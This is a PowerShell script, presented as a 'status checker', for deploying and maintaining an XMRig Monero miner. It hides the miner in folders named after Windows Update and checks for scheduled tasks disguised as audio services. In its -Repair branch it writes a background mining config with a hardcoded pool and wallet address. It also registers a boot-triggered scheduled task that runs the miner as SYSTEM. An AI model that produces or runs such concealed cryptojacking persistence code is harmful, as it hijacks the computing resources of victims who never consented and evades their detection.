# Simple Status Checker - Guaranteed to work with PowerShell 5.1
param([switch]$Repair)

Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "   SIMPLE STATUS CHECK" -ForegroundColor Cyan  
Write-Host "=====================================================" -ForegroundColor Cyan

# Check 1: XMRig Process
Write-Host "`n[1] Checking XMRig Process..." -ForegroundColor Yellow
$xmrigProcesses = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
if ($xmrigProcesses) {
    Write-Host "   OK: XMRig is running" -ForegroundColor Green
} else {
    Write-Host "   WARN: XMRig is NOT running" -ForegroundColor Yellow
}

# Check 2: Deployment Locations  
Write-Host "`n[2] Checking Deployment Locations..." -ForegroundColor Yellow
$locations = @(
    "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
    "C:\ProgramData\WindowsUpdater"
)

$validCount = 0
foreach ($loc in $locations) {
    if (Test-Path "$loc\xmrig.exe") {
        Write-Host "   OK: Found at $loc" -ForegroundColor Green
        $validCount++
    } else {
        Write-Host "   MISSING: $loc" -ForegroundColor Red
    }
}
Write-Host "   Total: $validCount/2 locations" -ForegroundColor Cyan

# Check 3: Scheduled Tasks
Write-Host "`n[3] Checking Scheduled Tasks..." -ForegroundColor Yellow
$taskCount = 0
$taskNames = @("WindowsAudioService", "UniversalMiner", "SystemAudioHost")
foreach ($task in $taskNames) {
    $exists = schtasks /query /tn $task 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Host "   OK: Task $task exists" -ForegroundColor Green
        $taskCount++
    }
}
if ($taskCount -eq 0) {
    Write-Host "   ERROR: No scheduled tasks found" -ForegroundColor Red
} else {
    Write-Host "   Total: $taskCount tasks found" -ForegroundColor Cyan
}

# Check 4: CPU Usage
Write-Host "`n[4] Checking System Load..." -ForegroundColor Yellow
try {
    $cpu = (Get-WmiObject win32_processor | Measure-Object -property LoadPercentage -Average).Average
    Write-Host "   CPU Usage: $cpu%" -ForegroundColor Cyan
} catch {
    Write-Host "   Could not read CPU usage" -ForegroundColor Yellow
}

# Check 5: Network
Write-Host "`n[5] Checking Network..." -ForegroundColor Yellow
$pingResult = Test-Connection "google.com" -Count 1 -Quiet
if ($pingResult) {
    Write-Host "   OK: Internet connection working" -ForegroundColor Green
} else {
    Write-Host "   WARN: No internet connection" -ForegroundColor Yellow
}

# Summary
Write-Host "`n=====================================================" -ForegroundColor Cyan
Write-Host "   SUMMARY" -ForegroundColor Cyan
Write-Host "=====================================================" -ForegroundColor Cyan

if ($validCount -eq 0) {
    Write-Host "ACTION NEEDED: No valid installations found" -ForegroundColor Red
    Write-Host "Run with -Repair to fix: .\simple_status.ps1 -Repair" -ForegroundColor Yellow
} else {
    Write-Host "System appears configured" -ForegroundColor Green
}

# Repair if requested
if ($Repair) {
    Write-Host "`n[REPAIR] Starting repair process..." -ForegroundColor Green
    
    # Create deployment location
    $mainLoc = "C:\ProgramData\WindowsUpdater"
    if (-not (Test-Path $mainLoc)) {
        New-Item -Path $mainLoc -ItemType Directory -Force | Out-Null
        Write-Host "   Created: $mainLoc" -ForegroundColor Green
    }
    
    # Copy files if source exists
    $sourceDir = "C:\Users\OM\Desktop\xmrig-6.22.2\miner_src"
    if (Test-Path $sourceDir) {
        Copy-Item "$sourceDir\*" -Destination $mainLoc -Recurse -Force
        Write-Host "   Copied miner files" -ForegroundColor Green
    }
    
    # Create basic config
    $config = @{
        autosave = $true
        background = $true
        cpu = @{
            enabled = $true
            "max-threads-hint" = 75
        }
        pools = @(
            @{
                algo = "rx/0"
                coin = "monero"  
                url = "gulf.moneroocean.stream:10128"
                user = "49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
                pass = "$env:COMPUTERNAME"
                keepalive = $true
                enabled = $true
            }
        )
    }
    $config | ConvertTo-Json -Depth 10 | Set-Content "$mainLoc\config.json"
    Write-Host "   Created config.json" -ForegroundColor Green
    
    # Create scheduled task
    $taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Settings>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
  </Settings>
  <Actions>
    <Exec>
      <Command>$mainLoc\xmrig.exe</Command>
      <Arguments>--config=$mainLoc\config.json</Arguments>
    </Exec>
  </Actions>
</Task>
"@
    
    $taskXml | Out-File "$env:TEMP\task.xml" -Encoding Unicode
    schtasks /create /tn "UniversalMiner" /xml "$env:TEMP\task.xml" /ru SYSTEM /f 2>&1 | Out-Null
    Remove-Item "$env:TEMP\task.xml" -Force
    Write-Host "   Created scheduled task" -ForegroundColor Green
    
    Write-Host "`nREPAIR COMPLETE!" -ForegroundColor Green
}

Write-Host "`n" -NoNewline
